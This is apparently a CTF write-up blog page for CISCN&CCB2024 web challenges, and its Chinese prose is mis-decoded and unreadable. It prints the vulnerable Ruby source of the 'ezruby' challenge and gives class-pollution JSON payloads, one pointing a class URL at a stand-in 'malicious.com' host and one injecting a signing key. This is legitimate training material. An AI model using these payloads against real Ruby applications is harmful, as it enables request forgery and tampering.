
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>CISCN&amp;CCB2024 | é›²æµã®Lowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdnæŒ‚æ‰çš„æ—¶å€™è¦å¯ä»¥å¼•ç”¨æœ¬åœ° -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- å¼•å…¥jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--æ”¹æˆäº†prismjsé«˜äº®-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- å¼•å…¥ä¸è’œå­-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- ä»£ç è¯­è¨€ -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- ä»£ç å—å¤åˆ¶ -->
<!-- å¼•å…¥clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- ä»£ç å—æ”¶ç¼© -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- ä»£ç å—æŠ˜è¡Œ -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="é›²æµã®Lowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- é¡µé¢ç‚¹å‡»ç‰¹æ•ˆ -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- æµè§ˆå™¨æ ‡é¢˜ -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- åŠ¨æ€èƒŒæ™¯ -->
    

    <!--æ–‡ç« ç›®å½•-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  ç›®å½•</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezruby%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">ezrubyï¼ˆUnsolvedï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#helloweb%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">hellowebï¼ˆå¤ç°ï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#safeproxy"><span class="toc-number">4.</span> <span class="toc-text">safeproxy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sxweb1%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">sxweb1ï¼ˆUnsolvedï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyweb%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">easywebï¼ˆUnsolvedï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sxweb2%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">sxweb2ï¼ˆUnsolvedï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BookManager%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">BookManagerï¼ˆUnsolvedï¼‰</span></a></li></ol>
    </div>
  

    <!--è¿”å›é¡¶éƒ¨-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="è¿”å›é¡¶éƒ¨">â†‘</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>ç¬¬ä¸€æ¬¡åŠ è½½æ–‡ç« å›¾ç‰‡å¯èƒ½ä¼šèŠ±è´¹è¾ƒé•¿æ—¶é—´</p>
                    <p>è¦ä¸æŒ‚ä¸ªæ¢¯å­è¯•è¯•ï¼Ÿï¼ˆx</p>
                    <p>åŠ è½½è¿‡æ…¢è¯·å¼€å¯ç¼“å­˜&ensp;æµè§ˆå™¨é»˜è®¤å¼€å¯</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>é›²æµã®LOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;é›²æµã®LOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>CISCN&amp;CCB2024</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/12/15
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTFçº¿ä¸Šèµ›
            </a>
        </span>
        
        
        <!--æ–‡ç« å­—æ•°ç»Ÿè®¡-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  å­—æ•°ç»Ÿè®¡: </span>
        <!-- å®‰è£…æ’ä»¶npm install hexo-wordcount --save -->
        <span class="post-count">2kå­—</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  é˜…è¯»æ—¶é•¿: </span>
        <span class="post-count">10åˆ†</span>
      </span>
    </span>
    
    <!--ä¸è’œå­ç»Ÿè®¡è®¿é—®æ•°-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    æ€»æ–‡ç« é˜…è¯»é‡ï¼š<span id="busuanzi_value_page_pv"></span>æ¬¡
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸€è§‰é†’æ¥NISAå®åŠ›ä¸‹é™ä¸€ä¸‡å€ï¼Œå“ˆå“ˆä¸¤äººé€€å½¹ä¹‹åæˆ‘ä»¬å®Œè›‹äº†</p>
<p>è¿™b webçœŸæ˜¯ä¸€å¤©æ¯”ä¸€å¤©éš¾æ‰“äº†ï¼Œæ¢­å“ˆåŠå¤©æ‹¿ä¸ä¸‹å°‘è§£é¢˜ï¼Œå…¶ä»–é¢˜å›å¤´å°±è¢«æ‰“çƒ‚</p>
<p>å­¦webæ•‘ä¸äº†NISAï¼Œå”‰æˆ‘å¥½èœå•ŠğŸ˜­</p>
<span id="more"></span>

<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215231840744.png" alt="image-20241215231840744"></p>
<hr>
<h1 id="ezrubyï¼ˆUnsolvedï¼‰"><a href="#ezrubyï¼ˆUnsolvedï¼‰" class="headerlink" title="ezrubyï¼ˆUnsolvedï¼‰"></a>ezrubyï¼ˆUnsolvedï¼‰</h1><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># frozen_string_literal: true</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'json'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/base'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'net/http'</span></span>


<span class="token keyword">class</span> <span class="token class-name">Person</span>
  <span class="token variable">@@url</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"http://default-url.com"</span></span>

  attr_accessor <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">:age</span><span class="token punctuation">,</span> <span class="token symbol">:details</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>
    <span class="token variable">@name</span> <span class="token operator">=</span> name
    <span class="token variable">@age</span> <span class="token operator">=</span> age
    <span class="token variable">@details</span> <span class="token operator">=</span> details
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">url</span></span>
    <span class="token variable">@@url</span>
  <span class="token keyword">end</span>


  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">merge_with</span></span><span class="token punctuation">(</span>additional<span class="token punctuation">)</span>
    recursive_merge<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> additional<span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token keyword">private</span>


  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">recursive_merge</span></span><span class="token punctuation">(</span>original<span class="token punctuation">,</span> additional<span class="token punctuation">,</span> current_obj <span class="token operator">=</span> original<span class="token punctuation">)</span>
    additional<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>key<span class="token punctuation">,</span> value<span class="token operator">|</span>
      <span class="token keyword">if</span> value<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
          next_obj <span class="token operator">=</span> current_obj<span class="token punctuation">.</span>public_send<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
          recursive_merge<span class="token punctuation">(</span>original<span class="token punctuation">,</span> value<span class="token punctuation">,</span> next_obj<span class="token punctuation">)</span>
        <span class="token keyword">else</span>
          new_object <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">new</span>
          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> new_object<span class="token punctuation">)</span>
          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key
        <span class="token keyword">end</span>
      <span class="token keyword">else</span>
        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>
          current_obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
        <span class="token keyword">else</span>
          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key
        <span class="token keyword">end</span>
      <span class="token keyword">end</span>
    <span class="token keyword">end</span>
    original
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> Person
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span> age<span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span> details<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>


<span class="token keyword">class</span> <span class="token class-name">KeySigner</span>
  <span class="token variable">@@signing_key</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"default-signing-key"</span></span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">signing_key</span></span>
    <span class="token variable">@@signing_key</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">sign</span></span><span class="token punctuation">(</span>signing_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">data</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">-signed-with-</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">signing_key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">JSONMergerApp</span> <span class="token operator">&lt;</span> Sinatra<span class="token double-colon punctuation">::</span>Base
  set  <span class="token symbol">:bind</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'0.0.0.0'</span></span>
  set  <span class="token symbol">:port</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'8888'</span></span>
  post <span class="token string-literal"><span class="token string">'/merge'</span></span> <span class="token keyword">do</span>
    content_type <span class="token symbol">:json</span>
    j_str <span class="token operator">=</span> request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>read
    <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"try try try"</span></span>  <span class="token keyword">if</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"\\"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"h"</span></span><span class="token punctuation">)</span>

    json_input <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span>parse<span class="token punctuation">(</span>j_str<span class="token punctuation">,</span> <span class="token symbol">symbolize_names</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">)</span>

    user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>
      <span class="token symbol">name</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"John Doe"</span></span><span class="token punctuation">,</span>
      <span class="token symbol">age</span><span class="token operator">:</span> <span class="token number">30</span><span class="token punctuation">,</span>
      <span class="token symbol">details</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string-literal"><span class="token string">"occupation"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Engineer"</span></span><span class="token punctuation">,</span>
        <span class="token string-literal"><span class="token string">"location"</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
          <span class="token string-literal"><span class="token string">"city"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Madrid"</span></span><span class="token punctuation">,</span>
          <span class="token string-literal"><span class="token string">"country"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Spain"</span></span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">)</span>

    user<span class="token punctuation">.</span>merge_with<span class="token punctuation">(</span>json_input<span class="token punctuation">)</span>

    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'merged'</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json
  <span class="token keyword">end</span>

  <span class="token comment"># GET /launch-curl-command - Activates the first gadget</span>
  get <span class="token string-literal"><span class="token string">'/launch-curl-command'</span></span> <span class="token keyword">do</span>
    content_type <span class="token symbol">:json</span>

    <span class="token comment"># This gadget makes an HTTP request to the URL stored in the User class</span>
    <span class="token keyword">if</span> Person<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:url</span><span class="token punctuation">)</span>
      url <span class="token operator">=</span> Person<span class="token punctuation">.</span>url
      response <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HTTP request made'</span></span><span class="token punctuation">,</span> <span class="token symbol">url</span><span class="token operator">:</span> url <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json
    <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'Failed to access URL variable'</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
  
  get <span class="token string-literal"><span class="token string">'/sign_with_subclass_key'</span></span> <span class="token keyword">do</span>
    content_type <span class="token symbol">:json</span>
    
    signer <span class="token operator">=</span> <span class="token class-name">KeySigner</span><span class="token punctuation">.</span><span class="token keyword">new</span>
    signed_data <span class="token operator">=</span> signer<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>KeySigner<span class="token punctuation">.</span>signing_key<span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"data-to-sign"</span></span><span class="token punctuation">)</span>

    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'Data signed'</span></span><span class="token punctuation">,</span> <span class="token symbol">signing_key</span><span class="token operator">:</span> KeySigner<span class="token punctuation">.</span>signing_key<span class="token punctuation">,</span> <span class="token symbol">signed_data</span><span class="token operator">:</span> signed_data <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json
  <span class="token keyword">end</span>
  
  get <span class="token string-literal"><span class="token string">'/check-infected-vars'</span></span> <span class="token keyword">do</span>
    content_type <span class="token symbol">:json</span>

    <span class="token punctuation">&#123;</span>
      <span class="token symbol">user_url</span><span class="token operator">:</span> Person<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
      <span class="token symbol">signing_key</span><span class="token operator">:</span> KeySigner<span class="token punctuation">.</span>signing_key
    <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json
  <span class="token keyword">end</span>

  get<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/'</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span>
    erb <span class="token symbol">:hello</span>
  <span class="token keyword">end</span>
  run<span class="token operator">!</span> <span class="token keyword">if</span> app_file <span class="token operator">==</span> $<span class="token number">0</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://github.com/HackTricks-wiki/hacktricks/blob/3e784b40f5711208c50e75daa3a5b1a839cb7316/pentesting-web/deserialization/ruby-class-pollution.md">https://github.com/HackTricks-wiki/hacktricks/blob/3e784b40f5711208c50e75daa3a5b1a839cb7316/pentesting-web/deserialization/ruby-class-pollution.md</a></p>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/cn/pentesting-web/deserialization/ruby-class-pollution">https://book.hacktricks.xyz/cn/pentesting-web/deserialization/ruby-class-pollution</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</a></p>
<p>payloadï¼šåè€…æ˜¯éšæœºæ‰¾ç±»è¦†ç›–çš„éœ€è¦å¤šæ¬¡å°è¯•</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"Http://malicious.com"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"signing_key"</span><span class="token operator">:</span><span class="token string">"injected-signing-key"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>å¼€å¤´è¿™ä¸ª<code># frozen_string_literal: true</code>ä¼šå†»ç»“æ‰€æœ‰å­—ç¬¦ä¸²å­—é¢é‡</p>
<p>è§‚å¯Ÿä¸€ä¸‹æ”¹åŠ¨çš„åœ°æ–¹</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">set  <span class="token symbol">:bind</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'0.0.0.0'</span></span>
set  <span class="token symbol">:port</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'8888'</span></span>

  <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"try try try"</span></span>  <span class="token keyword">if</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"\\"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"h"</span></span><span class="token punctuation">)</span>


  <span class="token keyword">if</span> Person<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:url</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> Person<span class="token punctuation">.</span>url
    response <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HTTP request made'</span></span><span class="token punctuation">,</span> <span class="token symbol">url</span><span class="token operator">:</span> url <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é‚£ä¹ˆå°±æ˜¯banäº†åæ–œæ å’Œ<code>h</code>ï¼ŒåŒæ—¶ curl æ— å›æ˜¾</p>
<p>å¯ä»¥ç”¨<code>H</code>ç»•è¿‡</p>
<p>ç„¶åæ¥ä¸‹æ¥çš„æ€è·¯æ˜¯åœ¨ JSONMergerApp é‡Œæ‰¾ä¸€ä¸ªèƒ½æ±¡æŸ“çš„å±æ€§æ¥å®ç°ç±»ä¼¼äºé™æ€æ–‡ä»¶è¯»å–æˆ–è€… getshell</p>
<hr>
<h1 id="hellowebï¼ˆå¤ç°ï¼‰"><a href="#hellowebï¼ˆå¤ç°ï¼‰" class="headerlink" title="hellowebï¼ˆå¤ç°ï¼‰"></a>hellowebï¼ˆå¤ç°ï¼‰</h1><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.php?file=hello.php</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
